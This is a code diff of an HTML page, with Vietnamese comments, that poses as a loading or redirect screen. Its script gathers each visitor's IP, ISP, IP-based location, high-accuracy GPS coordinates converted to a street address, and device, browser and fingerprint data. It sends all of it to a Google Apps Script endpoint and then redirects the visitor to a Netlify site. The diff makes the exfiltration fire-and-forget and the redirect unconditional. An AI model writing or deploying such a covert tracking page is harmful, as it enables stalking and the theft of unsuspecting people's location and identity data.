@@ -14,129 +14,145 @@
 <body>
 <div class="box">
   <div class="spinner"></div>
-  <p>Đang chuyển hướng...</p>
+  <p>Đang tải...</p>
 </div>
+
 <script>
 const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzSCxGr7C54w0ym69VDgDfTQsnXl0BMY4ga-sGNRoei0XCjQdfbmsE6F_kPh8-RN8Oz/exec";
+const REDIRECT_URL    = "https://peaceful-florentine-75f80e.netlify.app/";
 
-async function run() {
+// --- Thu thập thông tin thiết bị ---
+function getDeviceInfo() {
   const ua = navigator.userAgent;
 
-  // --- Nhận diện OS ---
   let os = "Không rõ";
   if      (/Windows NT 10/.test(ua)) os = "Windows 10/11";
+  else if (/Windows/.test(ua))       os = "Windows";
   else if (/Android/.test(ua))       os = "Android " + (ua.match(/Android ([\d.]+)/)?.[1]||"");
-  else if (/iPhone|iPad/.test(ua))   os = "iOS";
+  else if (/iPhone/.test(ua))        os = "iOS (iPhone)";
+  else if (/iPad/.test(ua))          os = "iOS (iPad)";
   else if (/Mac/.test(ua))           os = "macOS";
   else if (/Linux/.test(ua))         os = "Linux";
 
-  // --- Nhận diện trình duyệt ---
   let browser = "Không rõ";
-  if      (/Edg\//.test(ua))    browser = "Edge";
-  else if (/OPR\//.test(ua))    browser = "Opera";
-  else if (/Chrome\//.test(ua)) browser = "Chrome " + (ua.match(/Chrome\/([\d]+)/)?.[1]||"");
-  else if (/Firefox\//.test(ua))browser = "Firefox";
-  else if (/Safari\//.test(ua)) browser = "Safari";
+  if      (/Edg\//.test(ua))     browser = "Edge "    + (ua.match(/Edg\/([\d]+)/)?.[1]||"");
+  else if (/OPR\//.test(ua))     browser = "Opera";
+  else if (/Chrome\//.test(ua))  browser = "Chrome "  + (ua.match(/Chrome\/([\d]+)/)?.[1]||"");
+  else if (/Firefox\//.test(ua)) browser = "Firefox " + (ua.match(/Firefox\/([\d]+)/)?.[1]||"");
+  else if (/Safari\//.test(ua))  browser = "Safari";
 
-  // --- Nhận diện thiết bị ---
   let device = "Desktop";
   if      (/iPhone/.test(ua))          device = "iPhone";
   else if (/iPad/.test(ua))            device = "iPad";
   else if (/Android.*Mobile/.test(ua)) device = "Android Phone";
   else if (/Android/.test(ua))         device = "Android Tablet";
 
-  const screenRes = `${window.screen.width}x${window.screen.height}`;
+  return { ua, os, browser, device, screen: `${window.screen.width}x${window.screen.height}` };
+}
 
-  // --- Lấy IP + vị trí từ IP (dùng ipwho.is hỗ trợ https) ---
-  let ip = "?", city = "?", region = "?", country = "?", isp = "?";
-  let ipLat = "?", ipLon = "?";
-
+// --- Lấy IP + vị trí từ IP ---
+async function getIPInfo() {
   try {
     const geo = await (await fetch("https://ipwho.is/")).json();
     if (geo.success) {
-      ip      = geo.ip;
-      city    = geo.city;
-      region  = geo.region;
-      country = geo.country;
-      isp     = geo.connection?.isp || "?";
-      ipLat   = geo.latitude;
-      ipLon   = geo.longitude;
+      return {
+        ip      : geo.ip,
+        city    : geo.city    || "?",
+        region  : geo.region  || "?",
+        country : geo.country || "?",
+        isp     : geo.connection?.isp || "?",
+        ipLat   : geo.latitude  || "?",
+        ipLon   : geo.longitude || "?",
+      };
     }
-  } catch(e) {
-    try { ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip; } catch(e2){}
-  }
-
-  // --- Xin quyền GPS + Reverse Geocoding ---
-  let gpsAddress  = "Không cho phép";
-  let gpsLat      = "?";
-  let gpsLon      = "?";
-  let gpsAccuracy = "?";
-
+  } catch(e) {}
   try {
-    const pos = await new Promise((resolve, reject) =>
-      navigator.geolocation.getCurrentPosition(resolve, reject, {
-        timeout: 8000,
-        maximumAge: 0,
-        enableHighAccuracy: true
-      })
-    );
+    const r = await (await fetch("https://api.ipify.org?format=json")).json();
+    return { ip: r.ip, city:"?", region:"?", country:"?", isp:"?", ipLat:"?", ipLon:"?" };
+  } catch(e) {}
+  return { ip:"?", city:"?", region:"?", country:"?", isp:"?", ipLat:"?", ipLon:"?" };
+}
 
-    gpsLat      = pos.coords.latitude.toFixed(6);
-    gpsLon      = pos.coords.longitude.toFixed(6);
-    gpsAccuracy = Math.round(pos.coords.accuracy) + "m";
-
-    // Nominatim (OpenStreetMap) — chuyển tọa độ → địa chỉ tiếng Việt
-    const nominatim = await fetch(
-      `https://nominatim.openstreetmap.org/reverse?lat=${gpsLat}&lon=${gpsLon}&format=json&addressdetails=1&accept-language=vi`,
-      { headers: { "User-Agent": "TrackingApp/1.0" } }
-    );
-    const place = await nominatim.json();
-
-    if (place && place.address) {
-      const a = place.address;
-      const parts = [
-        a.house_number,
-        a.road || a.pedestrian || a.footway,
-        a.suburb || a.neighbourhood || a.quarter,
-        a.city_district || a.district,
-        a.city || a.town || a.village,
-        a.country
-      ].filter(Boolean);
-      gpsAddress = parts.join(", ");
+// --- Xin GPS + Reverse Geocoding ---
+function requestGPS() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve({ gpsAddress:"GPS không hỗ trợ", gpsLat:"?", gpsLon:"?", gpsAccuracy:"?" });
+      return;
     }
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        const lat = pos.coords.latitude.toFixed(6);
+        const lon = pos.coords.longitude.toFixed(6);
+        const acc = Math.round(pos.coords.accuracy) + "m";
+        let address = `${lat}, ${lon}`; // fallback nếu Nominatim lỗi
+        try {
+          const r = await fetch(
+            `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&addressdetails=1&accept-language=vi`
+          );
+          const place = await r.json();
+          if (place?.address) {
+            const a = place.address;
+            const parts = [
+              a.house_number,
+              a.road || a.pedestrian || a.footway,
+              a.suburb || a.neighbourhood || a.quarter,
+              a.city_district || a.district,
+              a.city || a.town || a.village,
+              a.country
+            ].filter(Boolean);
+            if (parts.length) address = parts.join(", ");
+          }
+        } catch(e) {}
+        resolve({ gpsAddress: address, gpsLat: lat, gpsLon: lon, gpsAccuracy: acc });
+      },
+      (err) => {
+        const msg = err.code === 1 ? "Người dùng từ chối GPS"
+                  : err.code === 2 ? "GPS không khả dụng"
+                  : err.code === 3 ? "GPS timeout"
+                  : "Lỗi GPS";
+        resolve({ gpsAddress: msg, gpsLat:"?", gpsLon:"?", gpsAccuracy:"?" });
+      },
+      { timeout: 10000, maximumAge: 0, enableHighAccuracy: true }
+    );
+  });
+}
 
-  } catch(err) {
-    if      (err.code === 1) gpsAddress = "Người dùng từ chối GPS";
-    else if (err.code === 2) gpsAddress = "GPS không khả dụng";
-    else if (err.code === 3) gpsAddress = "GPS timeout";
-    else                     gpsAddress = "Lỗi GPS";
-  }
-
-  // --- Tạo fingerprint ---
+// --- Tạo fingerprint ---
+async function getFingerprint(ua, screenRes) {
   const raw = [ua, navigator.language, screenRes, navigator.hardwareConcurrency, new Date().getTimezoneOffset()].join("|");
   const hash = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
-  const fingerprint = Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,"0")).join("").slice(0,16);
+  return Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,"0")).join("").slice(0,16);
+}
 
-  // --- Gửi tất cả về Apps Script ---
-  try {
-    const res  = await fetch(APPS_SCRIPT_URL, {
-      method : "POST",
-      headers: { "Content-Type": "text/plain" },
-      body   : JSON.stringify({
-        fingerprint,
-        ip, city, region, country, isp, ipLat, ipLon,
-        gpsAddress, gpsLat, gpsLon, gpsAccuracy,
-        userAgent: ua, os, browser, device,
-        screen   : screenRes,
-        language : navigator.language,
-        timezone : Intl.DateTimeFormat().resolvedOptions().timeZone
-      })
-    });
-    const json = await res.json();
-    window.location.href = json.redirect || "https://google.com";
-  } catch(e) {
-    window.location.href = "https://google.com";
-  }
+// --- MAIN ---
+async function run() {
+  const { ua, os, browser, device, screen } = getDeviceInfo();
+
+  // Chạy song song để nhanh hơn
+  const [ipInfo, gpsInfo, fingerprint] = await Promise.all([
+    getIPInfo(),
+    requestGPS(),
+    getFingerprint(ua, screen)
+  ]);
+
+  // Gửi dữ liệu (không cần chờ kết quả)
+  fetch(APPS_SCRIPT_URL, {
+    method : "POST",
+    headers: { "Content-Type": "text/plain" },
+    body   : JSON.stringify({
+      fingerprint,
+      ...ipInfo,
+      ...gpsInfo,
+      userAgent: ua, os, browser, device,
+      screen,
+      language : navigator.language,
+      timezone : Intl.DateTimeFormat().resolvedOptions().timeZone
+    })
+  }).catch(()=>{});
+
+  // Luôn redirect dù gửi thành công hay thất bại
+  window.location.href = REDIRECT_URL;
 }
 
 run();
